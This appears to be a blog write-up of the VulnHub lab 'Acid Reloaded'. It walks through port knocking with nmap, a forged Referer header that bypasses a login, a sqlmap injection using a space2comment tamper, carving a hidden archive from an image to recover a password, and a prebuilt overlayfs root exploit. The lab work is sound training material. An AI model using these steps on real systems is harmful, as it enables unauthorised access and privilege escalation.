---
title: VulnHub - Acid Reloaded
slug: vulnhub/acid-reloaded
template: item
date: 01-08-2016

taxonomy:
	category: [VulnHub]
	tag: [CTF, SQLi]
---

[VulnHub][VUL] provides materials allowing anyone to gain practical hands-on experience with digital security, computer applications and network administration tasks. `Acid Reloaded` is the sequel of the first one.

===

## Find & scan the machine

We use `netdiscover` to find the VM's IP address.

```text
root@kali:~$ netdiscover -r 172.16.130.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                           
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.16.130.1    00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                                                                            
 172.16.130.2    00:50:56:e4:b9:88      1      60  VMware, Inc.                                                                                                                                            
 172.16.130.131  00:0c:29:2f:eb:0d      1      60  VMware, Inc.                                                                                                                                            
 172.16.130.254  00:50:56:fd:6b:c0      1      60  VMware, Inc.
```

The VM's IP address is `172.16.130.131`. We do a scan with `nmap`.

```text
root@kali:~$ nmap -p 1-65535 -A -T4  172.16.130.131

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-30 08:20 CEST
Nmap scan report for 172.16.130.131
Host is up (0.00038s latency).
Not shown: 65533 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 cb:47:92:da:ea:b8:d3:82:16:22:0d:a5:5f:05:47:51 (DSA)
|   2048 fd:93:9d:28:57:fb:ef:e0:8e:f1:93:66:03:67:35:50 (RSA)
|_  256 a0:a6:52:fb:2c:32:b7:08:b4:ed:61:1d:2d:fa:c8:58 (ECDSA)
33447/tcp filtered unknown
MAC Address: 00:0C:29:2F:EB:0D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 172.16.130.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.30 seconds
```

`SSH` is running on port 22 but we need a username and a password to connect.

## Who's there?

```text
root@kali:~$ ssh  172.16.130.131 
The authenticity of host '172.16.130.131 (172.16.130.131)' can't be established.
ECDSA key fingerprint is SHA256:2JZsizcOMPdM+PmyHezvhujcgQ6Y0IjCaTWJCVaAGs8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.130.131' (ECDSA) to the list of known hosts.
    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 

									-by Acid

Wanna Knock me out ??? 
3.2.1 Let's Start the Game.
```

There is a hint in the message displayed:

```text
Wanna Knock me out ??? 
3.2.1 Let's Start the Game.
```

That's a reference to [port knocking][KNO]. Let's knock on the port `3`, `2` and `1` respectively.

```bash
root@kali:~$ for x in 3 2 1; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 172.16.130.131; done
[…] // Port knocking
```

Running `nmap` again shows what changed:

```text
root@kali:~$ nmap -p 1-65535 -A -T4  172.16.130.131

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-30 08:23 CEST
Nmap scan report for 172.16.130.131
Host is up (0.00042s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 cb:47:92:da:ea:b8:d3:82:16:22:0d:a5:5f:05:47:51 (DSA)
|   2048 fd:93:9d:28:57:fb:ef:e0:8e:f1:93:66:03:67:35:50 (RSA)
|_  256 a0:a6:52:fb:2c:32:b7:08:b4:ed:61:1d:2d:fa:c8:58 (ECDSA)
33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
|_http-server-header: Apache/2.4.10 (Ubuntu)
|_http-title: Acid-Reloaded
MAC Address: 00:0C:29:2F:EB:0D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 172.16.130.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds
```

Yeah! The firewall opened the port `33447`, used by `Apache`!

## The webpage

We can access to the webpage with the URL `http://172.16.130.131:33447/`.

![WBP]

There's nothing interesting in the source code so we might need to use `dirbuster` to try to find more directories & files.

![DIR]

`dirbuster` found the `/bin` directory, which displays a login page. We can try some SQLi but it doesn't work.

![BIN]

## HTTP Headers

`dirbuster` also found the page `/bin/dashboard.php`, which tells us that we're not authorized to access the page.

![DSH]

After trying some injections on the login page  we gave up. However, we can try to play with HTTP Headers. We assumed that when trying to log in, we're redirected to `/bin/includes/validation.php` and then to `/bin/dashboard.php`. (If the login is successful.)

So, with `burp` we tried to connect to `/bin/dashboard.php`, intercepted the request, and added `/bin/includes/validation.php` as the referer. (Yes, [it's mispelled!][REF])

```text
Referer: http://172.16.130.131:33447/bin/includes/validation.php
```

![BUR]

And it worked!

![SUC]

## SQLi

Clicking the link redirect us to `/bin/l33t_haxor.php`. Nothing fancy, except for a tiny bit of the source code:

```html
<a href="l33t_haxor.php?id=" style="text-decoration:none"></a>
```

It seems that we can give an `id` to the page as a GET variable. We tried different values to see what happens:

```text
id=0
// nothing

id=1
The hacker community may be small, but it possesses the skills that are driving the global economies of the future.

id=2
Younger hackers are hard to classify. They're probably just as diverse as the old hackers are. We're all over the map.

[…]

id=9
Hacking is a art of thinking outside the box in order to challenge the normal behaviour of application created by developers.

id=10
What is the difference between active recon and passive recon ????
```

We tried to see if it was sensible to SQLi, and the following message let us think that it's possible:

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') ORDER BY Description ASC' at line 1
```

If I use the space character, I get the message `HACKER DETECTED`. I launched `sqlmap` to do it quickly.

```text
root@kali:~$ sqlmap -u 'http://172.16.130.131:33447/bin/l33t_haxor.php?id=1' -p 'id' --table --dbms=MySQL --tamper=space2comment
         _
 ___ ___| |_____ ___ ___  {1.0.7.1#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:15:10

[…]

Database: secure_login                                                                                                                                                                                     
[4 tables]
+----------------------------------------------------+
| UB3R/strcpy.exe                                    |
| login_attempts                                     |
| members                                            |
| word                                               |
+----------------------------------------------------+

[…]
```

## Russian dolls

`UB3R/strcpy.exe` sounds very odd, and appears to be a file that can be downloaded on the URL `http://172.16.130.131:33447/UB3R/strcpy.exe`.

Let's take a look at this file.

```bash
root@kali:~$ file strcpy.exe 
strcpy.exe: PDF document, version 1.5
```

However, it seems that the file is really a RAR archive.

```bash
root@kali:~$ unrar l strcpy.exe

UNRAR 5.30 beta 2 freeware      Copyright (c) 1993-2015 Alexander Roshal

Archive: strcpy.exe
Details: RAR 4, SFX

 Attributes      Size     Date    Time   Name
----------- ---------  ---------- -----  ----
    ..A....        92  2015-08-23 18:16  acid.txt    
    ..A....     60961  2015-08-23 18:09  lol.jpg     
----------- ---------  ---------- -----  ----
                61053                    2

root@kali:~$ unrar e strcpy.exe

UNRAR 5.30 beta 2 freeware      Copyright (c) 1993-2015 Alexander Roshal

```

Let's unrar it.

```text
Extracting from strcpy.exe

Extracting  acid.txt                                                  OK 
Extracting  lol.jpg                                                   OK 
All OK
```

```text
root@kali:~$ cat acid.txt 
You are at right track.

Don't loose hope..

Good Luck :-)

Kind & Best Regards,
Acid
```

```text
root@kali:~$ strings lol.jpg 
[…]
"ot 
Avinash.contact
r9lD
,~E|i
TMcX
\	'|!
k\w;
{{5WH
aG]p
Q%,i]
UR]7
@7W!
Rv<{p]]D
gswW
@ugt 
hint.txt
`You have found a contact. Now, go and grab the details :-)
```

It looks like that another archive has been appended to the image. (The name of files like `Avinash.contact`, `hint.txt`.)

We discovered the tool `foremost` that did wonders to extract the appended file from the image.

```text
root@kali:~$ foremost -v lol.jpg 
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Sat Jul 30 13:26:16 2016
Invocation: foremost -v lol.jpg 
Output directory: /root/output
Configuration file: /etc/foremost.conf
Processing: lol.jpg
|------------------------------------------------------------------
File: lol.jpg
Start: Sat Jul 30 13:26:16 2016
Length: 59 KB (60961 bytes)
 
Num	 Name (bs=512)	       Size	 File Offset	 Comment 

0:	00000000.jpg 	      58 KB 	          0 	 
1:	00000117.rar 	      941 B 	      60020 	 
*|
Finish: Sat Jul 30 13:26:16 2016

2 FILES EXTRACTED
	
jpg:= 1
rar:= 1
------------------------------------------------------------------

Foremost finished at Sat Jul 30 13:26:16 2016
```

We can extract the data archived in that file

```text
root@kali:~$ unrar e output/rar/00000117.rar 

UNRAR 5.30 beta 2 freeware      Copyright (c) 1993-2015 Alexander Roshal


Extracting from output/rar/00000117.rar

Extracting  Avinash.contact                                           OK 
Extracting  hint.txt                                                  OK 
All OK
```

I get 2 files, the first one is `Avinash.contact`, a XML file:

```xml
root@kali:~$ cat Avinash.contact 
<?xml version="1.0" encoding="UTF-8"?>
<c:contact c:Version="1" xmlns:c="http://schemas.microsoft.com/Contact" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P" xmlns:MSWABMAPI="http://schemas.microsoft.com/Contact/Extended/MSWABMAPI">
    <c:CreationDate>2015-08-23T11:39:18Z</c:CreationDate>
    <c:Extended>
        <MSWABMAPI:PropTag0x3A58101F c:ContentType="binary/x-ms-wab-mapi" c:type="binary">AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</MSWABMAPI:PropTag0x3A58101F>
    </c:Extended>
    <c:ContactIDCollection>
        <c:ContactID c:ElementID="599ef753-f77f-4224-8700-e551bdc2bb1e">
            <c:Value>0bcf610e-a7be-4f26-9042-d6b3c22c9863</c:Value>
        </c:ContactID>
    </c:ContactIDCollection>
    <c:EmailAddressCollection>
        <c:EmailAddress c:ElementID="0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e">
            <c:Type>SMTP</c:Type>
            <c:Address>acid.exploit@gmail.com</c:Address>
            <c:LabelCollection>
                <c:Label>Preferred</c:Label>
            </c:LabelCollection>
        </c:EmailAddress>
        <c:EmailAddress c:ElementID="594eec25-47bd-4290-bd96-a17448f7596a" xsi:nil="true" />
    </c:EmailAddressCollection>
    <c:NameCollection>
        <c:Name c:ElementID="318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2">
            <c:FormattedName>Avinash</c:FormattedName>
            <c:GivenName>Avinash</c:GivenName>
        </c:Name>
    </c:NameCollection>
    <c:PersonCollection>
        <c:Person c:ElementID="865f9eda-796e-451a-92b1-bf8ee2172134">
            <c:FormattedName>Makke</c:FormattedName>
            <c:LabelCollection>
                <c:Label>wab:Spouse</c:Label>
            </c:LabelCollection>
        </c:Person>
    </c:PersonCollection>
    <c:PhotoCollection>
        <c:Photo c:ElementID="2fb5b981-cec1-45d0-ae61-7c340cfb3d72">
            <c:LabelCollection>
                <c:Label>UserTile</c:Label>
            </c:LabelCollection>
        </c:Photo>
    </c:PhotoCollection>
</c:contact>
```

The second one is a plaintext file `hint.txt`:

```text
root@kali:~$ cat hint.txt 
You have found a contact. Now, go and grab the details :-)
```

We might have obtained some crendetials!

```text
root@kali:~$ echo "AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=" | base64 -d
NooB@123
```

This is the password for the user `makke`, we can login with `ssh`:

```text
root@kali:~$ ssh makke@172.16.130.131
    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 

									-by Acid

Wanna Knock me out ??? 
3.2.1 Let's Start the Game.
                                                                              
makke@172.16.130.131's password: 
Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)

 * Documentation:  https://help.ubuntu.com/

214 packages can be updated.
132 updates are security updates.

Last login: Mon Aug 24 21:25:34 2015 from 192.168.88.236
makke@acid:~$
```

## What happens next is history

Let's see what's inside the current folder.

```text
makke@acid:~$ ll
total 32
drwxr-xr-x 3 makke makke 4096 Aug 24  2015 ./
drwxr-xr-x 4 root  root  4096 Aug 24  2015 ../
-rw------- 1 makke makke  205 Aug 24  2015 .bash_history
-rw-r--r-- 1 makke makke  220 Aug 24  2015 .bash_logout
-rw-r--r-- 1 makke makke 3760 Aug 24  2015 .bashrc
drwx------ 2 makke makke 4096 Aug 24  2015 .cache/
-rw-rw-r-- 1 makke makke   40 Aug 24  2015 .hint
-rw-r--r-- 1 makke makke  675 Aug 24  2015 .profile

makke@acid:~$ cat .hint 
Run the executable to own kingdom :-)
```

We tried to look for binaries owned by the user `makke` but it didn't help me. Finally, we took a look at `.bash_history` file.

```text
makke@acid:~$ cat .bash_history 
exit
cd ..
clear
cd /
ls
cd bin/
clear
./overlayfs 
clear
cd /home/makke/
clear
nano .hint
clear
ls
clear
ls
ls -a
cat .hint 
clear
cd /bin/
ls
./overlayfs 
clear
wgt
wget
apt-get remove wget
su
su -
exit
```

Ah! There seems to be an interesting executable, `/bin/overlayfs`. Perhaps the one we're looking for?

```text
makke@acid:~$ /bin/overlayfs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# cat /root/.flag.txt
Dear Hax0r,

You have completed the Challenge Successfully.

Your Flag is : "Black@Current@Ice-Cream"

Kind & Best Regards

-ACiD

Twitter:https://twitter.com/m_avinash143
Facebook: https://www.facebook.com/M.avinash143
LinkedIN: https://in.linkedin.com/pub/avinash-thapa/101/406/4b5
```

Success!

![CAT]

[VUL]: https://www.vulnhub.com/ "Vulnhub website"
[KNO]: https://en.wikipedia.org/wiki/Port_knocking "Port knocking on Wikipedia"
[WBP]: files/img/webpage.png "Webpage"
[DIR]: files/img/dirbuster.png "Dirbuster"
[BIN]: files/img/bin.png "/bin page"
[DSH]: files/img/dashboard_error.png "Dashboard - error"
[BUR]: files/img/burp.png "burp"
[REF]: https://en.wikipedia.org/wiki/HTTP_referer#Etymology "HTTP Referer"
[SUC]: files/img/dashboard_success.png "Dashboard - success"
[CAT]: files/img/success.jpg "Lolcat success"